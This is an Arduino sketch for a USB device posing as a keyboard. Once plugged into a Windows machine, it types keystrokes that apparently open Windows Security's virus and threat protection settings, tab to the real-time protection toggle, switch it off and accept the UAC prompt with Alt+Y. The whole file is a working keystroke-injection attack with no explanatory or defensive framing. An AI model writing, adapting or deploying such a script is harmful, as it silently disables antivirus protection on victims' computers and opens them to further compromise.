#include <Keyboard.h> 

void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  
  delay(500);

  typeKey(KEY_LEFT_GUI);

  delay(500);

  Keyboard.print("virus");
  delay(3000);
  typeKey(KEY_RETURN);

  delay(2000);

  typeKey(KEY_TAB);
   delay(200);

  typeKey(KEY_TAB);
 delay(200);
  typeKey(KEY_TAB);
 delay(200);
  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_RETURN);

  delay(200);

  typeKey(' ');

  delay(3000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
